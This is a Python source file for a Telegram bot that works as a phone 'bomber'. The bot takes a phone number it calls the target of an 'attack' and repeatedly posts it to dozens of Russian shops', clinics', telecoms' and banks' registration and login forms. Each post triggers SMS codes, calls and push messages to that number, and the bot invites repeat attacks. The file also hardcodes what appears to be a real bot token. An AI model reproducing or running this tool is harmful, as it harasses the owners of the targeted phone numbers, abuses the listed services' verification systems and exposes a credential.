import asyncio
import requests
import aiogram.utils.markdown as md
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.utils import executor



sms = [
    "https://tvoydom.ru/",
    "https://vitaexpress.ru/",
    "https://366.ru/?utm_source=google.com&utm_medium=organic&utm_campaign=google.com&utm_referrer=google.com",
    "https://apteka.ru/",
    "https://www.eapteka.ru/krasnodar/personal/profile/",
    "https://miratorg.ru/",
    "https://pizzaman.ru/personal/",
    "https://fiesta-pizza.ru/",
    "https://fsk.ru/",
    "https://lacoste.ru/account/register/",
    "https://www.r-ulybka.ru/personal/login/",
    "https://trofey.ru/",
    "https://marketing.beeline.ru/",
    "https://web.yota.ru/login",
    "https://www.mega-clinic.ru/account",
    "https://mega.ru/adygeya/",
    "https://gorserv.com/",
    "https://gazprombonus.ru/",
    "https://least.sale/auth/",
    "https://krasnodar.tele2.ru/lk?pageParams=askForRegion%3Dtrue",
    "https://vsesmart.ru/",
    "https://www.renins.ru/",
    "https://www.pokrishka.ru/",
    "http://leomax.ru",
    "https://krasnodar.taximaxim.ru/zakazi-taksi-onlajn",
    "https://samolet.ru/",
    "https://galamart.ru/profile/",
    "https://model-lavka.ru/",
    "https://lenta.com/npl/authentication/",
    "https://lk.idmclinic.ru/confirm-registration",
    "https://my.major-clinic.ru/login",
    "https://www.ugmk-clinic.ru/#modalRegisterRequest",
    "https://market.evotor.ru/store/auth/login",
    "https://lemurrr.ru/registration-card",
    "https://app.topseller.ru/login",
    "https://www.akusherstvo.ru/user.php?action=reg",
    "https://marketpapa.ru/register",
    "https://smotrim.ru/personal/login?redirect=%2Fpersonal%2Fpayment-choice%3Fplan%3Dsmotrim_annual%26redirect%3D%252F",
    "https://samizoo.ru/",
    "https://ochkarik.ru/?target=login",
    "https://flowwow.com/",
    "https://cvetov.ru/msk/auth/",
    "https://sendflowers.ru/customer/register",
    "https://getbuket.ru/",
    "https://cvetok39.ru/",
    "https://auto.ru/?utm_referrer=www.google.com",
    "https://my-shop.ru/shop/catalogue/3/sort/a/page/1.html#modal",
    "https://book24.ru/auth/?redirect=%2Fpersonal%2F",
    "https://lk.eurokappa.pro/",
    "https://my.modulbank.ru/#/signin",
    "https://nice-one.ru/#",
    "https://vipavenue.ru/",
    "https://hmonline.ru/registration"
]
call = [
	'https://fsk.ru/',
	'https://trofey.ru/',
	'https://krasnodar.taximaxim.ru/zakazi-taksi-onlajn',
	'https://ochkarik.ru/?target=login',
	'https://cvetov.ru/msk/auth/'
]
push = [
    'https://golden-time.ru/',
    'https://beeline.tv/signup/'
]





TOKEN = '6073336110:AAEdG_8_7tFTzr7T1uhzwoCeHu6HeJ_oTq4'  # Замените на свой токен
bot = Bot(token=TOKEN)
dp = Dispatcher(bot)
logging_middleware = LoggingMiddleware()
dp.middleware.setup(logging_middleware)

async def bomb(phone, message):
    counter = 1
    while counter <= 100:  # Ограничиваем до 100 запросов
        for i in sms:
            try:
                requests.post(f'{i}', data={'phone': phone})
                await message.answer(f'[+] Запрос(sms) x{counter}')
                counter += 1
            except Exception as e:
                await message.answer('[-] Ошибка')
                # print(e)
            await asyncio.sleep(2)  # Задержка внутри функции bomb

async def callbomb(phone, message):
    counter = 1
    while counter <= 100:  # Ограничиваем до 100 запросов
        for i in call:
            try:
                requests.post(f'{i}', data={'phone': phone})
                await message.answer(f'[+] Запрос(call) x{counter}')
                counter += 1
            except Exception as e:
                await message.answer('[-] Ошибка')
                # print(e)
            await asyncio.sleep(2)  # Задержка внутри функции callbomb



async def pushbomb(phone, message):
    counter = 1
    while counter <= 100:  # Ограничиваем до 100 запросов
        for i in push:
            try:
                requests.post(f'{i}', data={'phone': phone})
                await message.answer(f'[+] Запрос(push) x{counter}')
                counter += 1
            except Exception as e:
                await message.answer('[-] Ошибка')
                # print(e)
            await asyncio.sleep(2)  # Задержка внутри функции pushbomb




@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    await message.answer('''

    	Привет! Введите номер на который придет атака, без + и пробелов
    	(пример: 89101234567)
    	так-же число запросов ограничено до 100
    	после завершения атаки, вы можете заново вписать номер, для повторной атаки

    	''')

@dp.message_handler()
async def on_sms_bombing(message: types.Message):
    phone = message.text
    await asyncio.gather(bomb(phone, message), callbomb(phone, message), pushbomb(phone, message))

if __name__ == '__main__':
    from aiogram import executor
    executor.start_polling(dp, skip_updates=True)
